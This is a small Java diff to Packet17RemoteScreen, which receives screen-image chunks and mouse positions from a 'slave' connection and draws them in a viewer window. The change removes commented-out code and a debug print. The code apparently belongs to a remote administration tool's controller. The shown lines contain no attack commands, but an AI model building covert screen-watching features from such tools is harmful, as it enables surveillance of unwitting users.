@@ -39,12 +39,12 @@ public class Packet17RemoteScreen extends AbstractIncomingPacket {
 
 		int mouseX = slave.readInt();
 		int mouseY = slave.readInt();
-		
+
 		int blen = slave.readInt();
 
 		int x = slave.readInt();
 		int y = slave.readInt();
-		
+
 		byte[] buffer = new byte[blen];
 		slave.getDataInputStream().readFully(buffer);
 
@@ -72,31 +72,18 @@ public class Packet17RemoteScreen extends AbstractIncomingPacket {
 
 				int size = 0;
 
-				// for (int x = 0; x < rows; x++) {
-				// for (int y = 0; y < cols; y++) {
 				itd.setChunks(itd.getChunks() + 1);
-				//if (slave.readBoolean()) {
-					itd.setUpdatedChunks(itd.getUpdatedChunks() + 1);
+				itd.setUpdatedChunks(itd.getUpdatedChunks() + 1);
 
-					
-					
-					System.out.println(x + ", " + y);
+				BufferedImage image = ImageUtils.decodeImage(buffer);
+				imageGraphics.drawImage(image, chunkWidth * y, chunkHeight * x, null);
 
-					
-
-					// buffer = Crypto.decrypt(GZip.decompress(buffer),
-					// slave.getConnection().getKey());
-
-					BufferedImage image = ImageUtils.decodeImage(buffer);
-					imageGraphics.drawImage(image, chunkWidth * y, chunkHeight * x, null);
-
-					Traffic.increaseReceived(slave, blen);
-					frame.lbl.repaint();
-					frame.lbl.revalidate();
-					frame.progressBar.setValue(frame.progressBar.getValue() + 1);
-					frame.setLatestChunkSize(blen);
-					size += blen;
-				//}
+				Traffic.increaseReceived(slave, blen);
+				frame.lbl.repaint();
+				frame.lbl.revalidate();
+				frame.progressBar.setValue(frame.progressBar.getValue() + 1);
+				frame.setLatestChunkSize(blen);
+				size += blen;
 
 				imageGraphics.drawImage(MOUSE_CURSOR, mouseX, mouseY, 16, 16, null);
 				frame.lbl.repaint();
